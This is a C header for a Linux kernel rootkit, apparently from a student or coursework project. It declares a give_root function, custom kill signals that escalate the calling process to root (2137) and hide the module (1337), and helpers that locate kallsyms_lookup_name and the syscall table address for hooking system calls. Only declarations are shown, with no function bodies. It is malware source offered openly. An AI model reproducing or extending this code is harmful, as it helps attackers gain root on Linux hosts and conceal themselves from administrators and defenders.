#ifndef BSO_ROOTKIT_UTILS_H
#define BSO_ROOTKIT_UTILS_H

#include <linux/kprobes.h>
#include <linux/slab.h>
#include <linux/dirent.h>


/*
 * Signals to use with kill.
 */
enum {
    SIGROOT = 2137, // Escalate to root
    SIGHIDEMOD = 1337, // Hide this rootkid
};

enum {
    HIDDEN = 0,
    VISIBLE = 1
};


typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);

typedef asmlinkage unsigned long (*pt_regs_t)(const struct pt_regs *regs);

void give_root(void);

unsigned long *get_sys_call_table_addr(void);
kallsyms_lookup_name_t get_kallsyms_lookup_name(void);

extern kallsyms_lookup_name_t kallsyms_lookup_name_;

#endif //BSO_ROOTKIT_UTILS_H
